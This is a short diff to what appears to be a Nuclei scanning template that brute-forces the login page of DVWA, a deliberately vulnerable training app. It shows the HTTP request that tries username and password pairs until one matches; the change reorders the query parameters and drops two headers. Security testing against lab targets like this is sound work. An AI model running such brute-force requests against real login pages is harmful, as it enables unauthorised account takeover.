@@ -70,6 +70,7 @@ flow: |
     }
   }
 
+
 http:
   # Step 1: Authenticate and get PHPSESSID and user_token
   - raw:
@@ -111,10 +112,8 @@ http:
   # Step 3: Execute Brute Force (Iterates Over Usernames and Passwords)
   - raw:
       - |
-        GET /DVWA/vulnerabilities/brute/?Login=Login&username={{user}}&password={{pass}} HTTP/1.1
+        GET /DVWA/vulnerabilities/brute/?username={{user}}&password={{pass}}&Login=Login HTTP/1.1
         Host: {{Hostname}}
-        Accept: */*
-        Connection: close
 
     stop-at-first-match: true
     matchers-condition: and
